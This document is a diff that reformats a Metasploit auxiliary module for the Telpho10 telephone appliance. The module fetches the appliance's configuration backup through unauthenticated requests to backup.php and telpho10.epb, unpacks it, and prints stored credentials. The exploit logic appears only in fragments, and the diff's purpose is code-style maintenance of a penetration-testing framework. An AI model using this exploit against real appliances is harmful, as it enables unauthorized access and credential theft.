@@ -7,27 +7,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Telpho10 Backup Credentials Dumper',
-      'Description'    => %q{
-        This module exploits a vulnerability present in all versions of Telpho10 telephone system
-        appliance. This module generates a configuration backup of Telpho10,
-        downloads the file and dumps the credentials for admin login,
-        phpmyadmin, phpldapadmin, etc.
-        This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.
-      },
-      'Author'         => 'Jan Rude', # Vulnerability Discovery and Metasploit Module
-      'License'        => MSF_LICENSE,
-      'References'     => ['URL', 'https://github.com/whoot/TelpOWN'],
-      'Platform'       => 'linux',
-      'Privileged'     => false,
-      'DisclosureDate' => '2016-09-02'))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Telpho10 Backup Credentials Dumper',
+        'Description' => %q{
+          This module exploits a vulnerability present in all versions of Telpho10 telephone system
+          appliance. This module generates a configuration backup of Telpho10,
+          downloads the file and dumps the credentials for admin login,
+          phpmyadmin, phpldapadmin, etc.
+          This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.
+        },
+        'Author' => 'Jan Rude', # Vulnerability Discovery and Metasploit Module
+        'License' => MSF_LICENSE,
+        'References' => ['URL', 'https://github.com/whoot/TelpOWN'],
+        'Platform' => 'linux',
+        'Privileged' => false,
+        'DisclosureDate' => '2016-09-02'
+      )
+    )
 
-      register_options(
-        [
-          Opt::RPORT(80)
-        ])
+    register_options(
+      [
+        Opt::RPORT(80)
+      ]
+    )
   end
 
   # Used for unpacking backup files
@@ -91,12 +96,11 @@ class MetasploitModule < Msf::Auxiliary
     print_status('-------------')
     print_good("ID:       #{config.first[/ftpbackupid\',\'(.*?)\'/, 1]}")
     print_good("Password: #{config.first[/ftpbackuppw\',\'(.*?)\'/, 1]}\n")
-
   end
 
   def run
     res = send_request_cgi({
-      'uri'  => '/telpho/system/backup.php',
+      'uri' => '/telpho/system/backup.php',
       'method' => 'GET'
     })
     if res && res.code == 200
@@ -109,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Downloading backup')
     res = send_request_cgi({
-      'uri'    => '/telpho/temp/telpho10.epb',
+      'uri' => '/telpho/temp/telpho10.epb',
       'method' => 'GET'
     })
     if res && res.code == 200
